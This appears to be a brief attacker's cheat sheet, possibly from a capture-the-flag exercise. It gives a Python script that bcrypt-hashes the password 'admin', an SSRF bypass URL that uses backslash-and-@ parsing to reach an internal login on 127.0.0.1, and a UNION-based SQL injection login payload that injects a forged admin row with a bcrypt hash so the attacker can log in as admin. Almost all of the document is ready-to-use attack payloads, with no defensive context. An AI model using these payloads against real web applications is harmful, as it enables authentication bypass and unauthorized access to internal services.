craft hash
```python
import bcrypt

# 1. Set the password you want to hash
my_password = "admin"

# 2. Encode the password into bytes (bcrypt requires this)
password_bytes = my_password.encode('utf-8')

# 3. Generate a salt
# The salt is random data that makes the hash unique
salt = bcrypt.gensalt()

# 4. Create the hash
hashed_password = bcrypt.hashpw(password_bytes, salt)

# 5. Decode the hash back into a string to print it
final_hash = hashed_password.decode('utf-8')

print(f"Password: {my_password}")
print(f"Bcrypt Hash: {final_hash}")
```

ssrf bypass
```python
http://127.0.0.1\@certainweb.com/../internal_login
```

sql injection
```python
username=admin'+UNION+SELECT+1,'admin','$2a$12$k8Sg4DNRdaOdlV8EWpfA1.0Fx4B05JGiPOkVdkPkZe/.WpZm4Ug0m'-- -&password=admin
```